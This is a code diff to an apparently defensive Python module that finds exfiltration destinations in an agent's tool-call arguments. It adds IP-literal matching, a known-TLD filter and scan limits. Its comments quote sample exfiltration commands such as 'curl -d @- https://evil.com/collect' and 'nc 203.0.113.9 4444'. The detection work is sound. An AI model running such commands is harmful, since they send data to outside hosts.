@@ -45,10 +45,25 @@ from .tiers import capability
 _SECRET_RES = [re.compile(p) for p in SECRET_PATTERNS]
 _HOST_RE = re.compile(r"https?://([^/\s:]+)", re.IGNORECASE)
 _EMAIL_HOST_RE = re.compile(r"@([\w.-]+)")
-# A bare domain (no scheme) with a plausible TLD - catches `nc evil.com 443` or
-# `scp file user@host:` style destinations inside command arguments.
-_BARE_HOST_RE = re.compile(
-    r"\b((?:[a-z0-9](?:[a-z0-9-]*[a-z0-9])?\.)+[a-z]{2,24})\b", re.IGNORECASE)
+# A bare domain (no scheme) - catches `nc evil.com 443` or `scp file user@host:`
+# destinations inside command arguments.  Written with one quantifier per label
+# (no nested optional group) so it cannot backtrack quadratically on a long
+# dotted string.  A curated TLD set is applied afterwards in code, because a
+# permissive `[a-z]{2,24}` tail matches ordinary filenames ("data.csv") and
+# SQL-qualified names ("analytics.orders"), which are not destinations.
+_BARE_HOST_RE = re.compile(r"\b(?:[a-z0-9-]{1,63}\.)+[a-z]{2,24}\b", re.IGNORECASE)
+# An IPv4 literal destination, e.g. `nc 203.0.113.9 443` - these carry no TLD so
+# the domain path above can never see them.
+_IPV4_RE = re.compile(r"\b(?:\d{1,3}\.){3}\d{1,3}\b")
+# IPv6 in bracketed URL form or a bare run of hextets.
+_IPV6_RE = re.compile(r"\[[0-9a-f:]{2,45}\]|\b(?:[0-9a-f]{1,4}:){2,7}[0-9a-f]{1,4}\b",
+                      re.IGNORECASE)
+
+# Public suffixes common enough to be plausible exfiltration destinations.  A
+# dotted token whose final label is not one of these is treated as a filename /
+# identifier, not a host - which is what keeps `report.csv`, `schema.orders` and
+# `module.py` from being read as external destinations.
+_KNOWN_TLDS = frozenset(["com", "net", "org", "io", "co", "ai", "app", "dev", "cloud", "xyz", "info", "biz", "me", "sh", "gg", "to", "ly", "cc", "tv", "link", "click", "site", "online", "store", "tech", "space", "fun", "icu", "top", "live", "pro", "work", "world", "site", "host", "press", "us", "uk", "de", "fr", "jp", "cn", "ru", "in", "br", "au", "ca", "eu", "nl", "se", "no", "es", "it", "pl", "ch", "at", "be", "dk", "fi", "ie", "nz", "za", "mx", "kr", "sg", "hk", "tw", "il", "tr", "gr", "pt", "cz", "hu", "ro", "ua", "id", "my", "th", "vn", "ph", "ar", "cl", "pe", "ng", "ke", "eg", "sa", "ae", "pk", "bd", "ir", "lt", "lv", "ee", "sk", "si", "hr", "rs", "bg", "by", "kz", "uz", "np", "lk", "mm", "kh", "la", "mn", "ge", "am", "az", "md", "is", "lu", "mt", "cy", "gov", "edu", "mil", "int", "arpa", "onion"])
 _ZERO_WIDTH_RE = re.compile(r"[​‌‍⁠﻿­]")
 _B64_RE = re.compile(r"[A-Za-z0-9+/]{16,}={0,2}")
 _HEX_RE = re.compile(r"(?:[0-9a-fA-F]{2}){8,}")
@@ -59,6 +74,8 @@ _HEX_RE = re.compile(r"(?:[0-9a-fA-F]{2}){8,}")
 # best-effort decode of *encoded* secrets is limited to the leading window.
 _MAX_DECODE_SCAN = 65_536
 _MAX_DECODE_BLOBS = 64
+# Host extraction is regex over free text; bound it for the same reason.
+_MAX_HOST_SCAN = 65_536
 
 # arg keys that carry a destination
 _DEST_KEYS = ("url", "endpoint", "dest", "destination", "to", "cc", "bcc",
@@ -113,18 +130,24 @@ def _hosts_in(value: str) -> list[str]:
 
 
 def _hosts_in_text(text: str) -> list[str]:
-    """Hosts referenced anywhere in free text (URLs, bare domains, e-mails).
+    """Hosts referenced anywhere in free text (URLs, bare domains, IPs, e-mails).
 
     Used to spot an exfiltration destination embedded in a command line or other
-    non-address argument, e.g. ``curl -d @- https://evil.com/collect``.
+    non-address argument, e.g. ``curl -d @- https://evil.com/collect`` or
+    ``nc 203.0.113.9 4444``.  Bare dotted tokens only count when their final
+    label is a real public suffix, so filenames and SQL-qualified identifiers are
+    not mistaken for destinations.
     """
+    window = text[:_MAX_HOST_SCAN]
     hosts: list[str] = []
-    for m in _HOST_RE.findall(text):
-        hosts.append(m.lower())
-    for m in _EMAIL_HOST_RE.findall(text):
-        hosts.append(m.lower())
-    for m in _BARE_HOST_RE.findall(text):
-        hosts.append(m.lower())
+    hosts.extend(m.lower() for m in _HOST_RE.findall(window))
+    hosts.extend(m.lower() for m in _EMAIL_HOST_RE.findall(window))
+    for m in _BARE_HOST_RE.findall(window):
+        if m.rsplit(".", 1)[-1].lower() in _KNOWN_TLDS:
+            hosts.append(m.lower())
+    hosts.extend(m for m in _IPV4_RE.findall(window))
+    hosts.extend(m.lower().strip("[]") for m in _IPV6_RE.findall(window))
+
     seen: set[str] = set()
     out: list[str] = []
     for h in hosts:
